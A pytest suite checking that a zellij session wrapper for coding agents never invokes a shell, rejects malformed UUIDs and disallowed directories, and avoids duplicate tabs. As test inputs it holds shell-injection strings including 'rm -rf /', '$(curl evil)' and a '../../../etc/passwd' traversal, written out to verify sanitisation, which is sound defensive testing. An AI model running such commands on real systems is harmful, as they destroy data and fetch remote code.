"""Shell-free guarantees for the zellij wrapper.

These tests are the contract: no matter what the metadata/cwd/uuid contains,
the wrapper must NEVER invoke a shell. They also pin the rename-doesn't-duplicate
guarantee from issue #56's Hermes review #6.
"""

from __future__ import annotations

import subprocess
from unittest.mock import MagicMock

import pytest

from agent_sessions import zellij


def _make_runner(*, existing_tabs: list[str] | None = None):
    """Stub for subprocess.run: replies to `query-tab-names` with the given tabs;
    no-ops on every other call. Records all invocations on `runner.calls`."""
    runner = MagicMock()
    runner.calls = []  # type: ignore[attr-defined]

    def side_effect(argv, **kw):
        runner.calls.append(argv)
        cp = MagicMock()
        cp.returncode = 0
        cp.stdout = "\n".join(existing_tabs or [])
        return cp

    runner.side_effect = side_effect
    return runner


# ---- shell-free contract ------------------------------------------------------


def test_no_call_uses_shell_true():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for call in runner.call_args_list:
        kwargs = call.kwargs
        assert kwargs.get("shell", False) is False, f"shell=True leaked: {call}"


def test_argv_is_a_list_not_a_string():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for argv in runner.calls:
        assert isinstance(argv, list), f"argv must be a list: {argv!r}"
        assert all(isinstance(a, str) for a in argv), f"all argv entries must be str: {argv!r}"


def test_never_invokes_bash_or_sh():
    runner = _make_runner()
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    for argv in runner.calls:
        head = argv[0]
        assert head not in {
            "/bin/sh",
            "/bin/bash",
            "sh",
            "bash",
        }, f"unexpected shell at argv[0]: {argv!r}"
        assert "-c" not in argv, f"-c flag never belongs in our calls: {argv!r}"


def test_crafted_title_never_reaches_shell_context():
    """A title with shell-meta chars must be sanitized and STILL never reach a shell."""
    runner = _make_runner()
    nasty = "; rm -rf / && echo pwned `$(curl evil)`"
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title=nasty,
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    # find the new-tab call; the title should appear only inside the argv list
    new_tab_calls = [c for c in runner.calls if "new-tab" in c]
    assert new_tab_calls, "expected a new-tab call"
    name_idx = new_tab_calls[0].index("--name") + 1
    sanitized = new_tab_calls[0][name_idx]
    assert ";" not in sanitized
    assert "`" not in sanitized
    assert "$" not in sanitized
    assert len(sanitized) <= 64


# ---- input validation ---------------------------------------------------------


@pytest.mark.parametrize(
    "bad_uuid",
    [
        "not-a-uuid",
        "../../../etc/passwd",
        "",
        "abcdef12-1234-1234-1234-1234567890ab; ls",
        "abcdef12_1234_1234_1234_1234567890ab",
    ],
)
def test_bad_uuid_rejected(bad_uuid):
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_or_switch(
            uuid=bad_uuid,
            cwd="/tmp/x",
            title="t",
            allowed_cwds={"/tmp/x"},
            _runner=runner,
        )


def test_cwd_must_be_in_scanned_set():
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_or_switch(
            uuid="abcdef12-1234-1234-1234-1234567890ab",
            cwd="/etc",  # not in scanned set
            title="t",
            allowed_cwds={"/tmp/x"},
            _runner=runner,
        )


# ---- open-or-switch + rename idempotency --------------------------------------


def test_new_tab_when_no_existing(stub_zellij=None):
    runner = _make_runner(existing_tabs=[])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    assert len(new_tabs) == 1
    assert not go_to


def test_switch_when_short_uuid_prefix_matches():
    runner = _make_runner(existing_tabs=["abcdef12:hello"])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="hello",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    assert len(go_to) == 1
    assert not new_tabs


def test_rename_does_not_create_duplicate_tab():
    """The bug from issue #56 Hermes review #6: renaming a session must not
    spawn a second Zellij tab on re-open. Lookup is by short-UUID prefix."""
    # Tab still carries the old title; sidebar now has the new title.
    runner = _make_runner(existing_tabs=["abcdef12:OLD title"])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="NEW title",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    new_tabs = [c for c in runner.calls if "new-tab" in c]
    go_to = [c for c in runner.calls if "go-to-tab-name" in c]
    rename = [c for c in runner.calls if "rename-tab" in c]
    assert not new_tabs, "renaming the sidebar title must not spawn a duplicate tab"
    assert len(go_to) == 1
    assert len(rename) == 1  # best-effort rename to match the new title


def test_switch_self_heals_duplicate_tabs():
    """Earlier query races could leave several tabs for one session (concurrent
    `claude --resume` writers → mixing). A switch must close the extras, keep one,
    and never spawn another. Regression for the switch-dedupe fix."""
    runner = _make_runner(
        existing_tabs=[
            "Tab #1",
            "abcdef12:automation workflow",  # dup 1 (kept)
            "7f8c2040:other",
            "abcdef12:automation workflow",  # dup 2 (closed)
            "abcdef12:I often tell the agents",  # dup 3 (closed)
        ]
    )
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="automation workflow",
        allowed_cwds={"/tmp/x"},
        _runner=runner,
    )
    assert not [c for c in runner.calls if "new-tab" in c], "must not spawn a duplicate"
    # Two extra matches → two close-tab calls; the survivor is focused exactly once.
    assert len([c for c in runner.calls if "close-tab" in c]) == 2
    assert len([c for c in runner.calls if "go-to-tab-name" in c]) == 1


def test_switch_raises_on_unreachable_session_instead_of_duplicating():
    """A transient query failure must NOT look like 'no tabs' (which would spawn a
    duplicate). It surfaces as an error so the click can be retried cleanly."""
    runner = MagicMock()
    runner.calls = []

    def side_effect(argv, **kw):
        runner.calls.append(argv)
        if "query-tab-names" in argv:
            raise subprocess.TimeoutExpired(cmd=argv, timeout=8)
        cp = MagicMock()
        cp.returncode = 0
        cp.stdout = ""
        return cp

    runner.side_effect = side_effect
    with pytest.raises(zellij.ZellijError):
        zellij.open_or_switch(
            uuid="abcdef12-1234-1234-1234-1234567890ab",
            cwd="/tmp/x",
            title="x",
            allowed_cwds={"/tmp/x"},
            _runner=runner,
        )
    assert not [c for c in runner.calls if "new-tab" in c]


def test_resume_bypass_adds_skip_permissions_flag():
    runner = _make_runner(existing_tabs=[])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="t",
        allowed_cwds={"/tmp/x"},
        bypass=True,
        _runner=runner,
    )
    new_tab = next(c for c in runner.calls if "new-tab" in c)
    assert "--dangerously-skip-permissions" in new_tab
    assert "--resume" in new_tab


def test_resume_without_bypass_omits_flag():
    runner = _make_runner(existing_tabs=[])
    zellij.open_or_switch(
        uuid="abcdef12-1234-1234-1234-1234567890ab",
        cwd="/tmp/x",
        title="t",
        allowed_cwds={"/tmp/x"},
        bypass=False,
        _runner=runner,
    )
    new_tab = next(c for c in runner.calls if "new-tab" in c)
    assert "--dangerously-skip-permissions" not in new_tab


def test_new_session_shell_free_and_cwd_allowlisted():
    runner = _make_runner(existing_tabs=[])
    tab = zellij.new_session(
        cwd="/home/user/claude/example-app",
        title="; rm -rf / `evil`",
        allowed_cwds={"/home/user/claude/example-app"},
        bypass=True,
        _runner=runner,
    )
    call = runner.calls[-1]
    assert isinstance(call, list) and all(isinstance(a, str) for a in call)
    assert call[0] not in {"sh", "bash", "/bin/sh", "/bin/bash"}
    assert "-c" not in call
    assert "--resume" not in call  # brand new session, not a resume
    assert "--dangerously-skip-permissions" in call
    # tab name sanitized — no shell metachars
    assert ";" not in tab and "`" not in tab


def test_new_session_rejects_cwd_outside_allowlist():
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.new_session(
            cwd="/etc",
            title="t",
            allowed_cwds={"/home/user/claude"},
            _runner=runner,
        )


def test_engine_tab_prefixes():
    """Claude keeps the bare ``<short>:`` tab name; a non-empty engine prefix
    (opencode → ``o``) yields ``<prefix>:<short>:`` so engines can't collide."""
    assert zellij.sanitize_tab_name("abcdef12", "test").startswith("abcdef12:")
    assert zellij.sanitize_engine_tab("", "abcdef12", "test").startswith("abcdef12:")
    assert zellij.sanitize_engine_tab("o", "ses_abc", "test").startswith("o:ses_abc:")


# ---- engine-agnostic dispatch (open_engine / new_engine) ----------------------


def test_open_engine_shell_free_and_prefixed():
    runner = _make_runner(existing_tabs=[])
    tab = zellij.open_engine(
        engine_prefix="o",
        short="ses_abcd1234",
        cwd="/tmp/x",
        title="; rm -rf / `evil`",
        allowed_cwds={"/tmp/x"},
        argv=["opencode", "/tmp/x", "--session", "ses_abcd1234"],
        _runner=runner,
    )
    assert tab.startswith("o:ses_abcd1234:")
    new_tab = next(c for c in runner.calls if "new-tab" in c)
    assert isinstance(new_tab, list) and all(isinstance(a, str) for a in new_tab)
    assert new_tab[0] not in {"sh", "bash", "/bin/sh", "/bin/bash"} and "-c" not in new_tab
    # the opencode argv rides after the `--` separator, never through a shell
    assert "opencode" in new_tab and "--session" in new_tab and "ses_abcd1234" in new_tab
    # crafted title is sanitized in the tab name
    assert ";" not in tab and "`" not in tab


def test_open_engine_switches_by_prefix_no_duplicate():
    runner = _make_runner(existing_tabs=["o:ses_abcd1234:OLD"])
    zellij.open_engine(
        engine_prefix="o",
        short="ses_abcd1234",
        cwd="/tmp/x",
        title="NEW",
        allowed_cwds={"/tmp/x"},
        argv=["opencode", "/tmp/x", "--session", "ses_abcd1234"],
        _runner=runner,
    )
    assert not [c for c in runner.calls if "new-tab" in c]
    assert len([c for c in runner.calls if "go-to-tab-name" in c]) == 1


def test_open_engine_rejects_cwd_outside_allowlist():
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_engine(
            engine_prefix="o",
            short="ses_abcd1234",
            cwd="/etc",
            title="t",
            allowed_cwds={"/tmp/x"},
            argv=["opencode", "/etc", "--session", "ses_abcd1234"],
            _runner=runner,
        )


def test_open_engine_rejects_empty_argv():
    runner = _make_runner()
    with pytest.raises(zellij.ZellijError):
        zellij.open_engine(
            engine_prefix="o",
            short="ses_abcd1234",
            cwd="/tmp/x",
            title="t",
            allowed_cwds={"/tmp/x"},
            argv=[],
            _runner=runner,
        )


def test_new_engine_prefixed_and_shell_free():
    runner = _make_runner(existing_tabs=[])
    tab = zellij.new_engine(
        engine_prefix="o",
        cwd="/tmp/x",
        title="fresh",
        allowed_cwds={"/tmp/x"},
        argv=["opencode", "/tmp/x"],
        _runner=runner,
    )
    assert tab.startswith("o:new:")
    call = runner.calls[-1]
    assert isinstance(call, list) and call[0] not in {"sh", "bash"} and "-c" not in call
    assert "opencode" in call
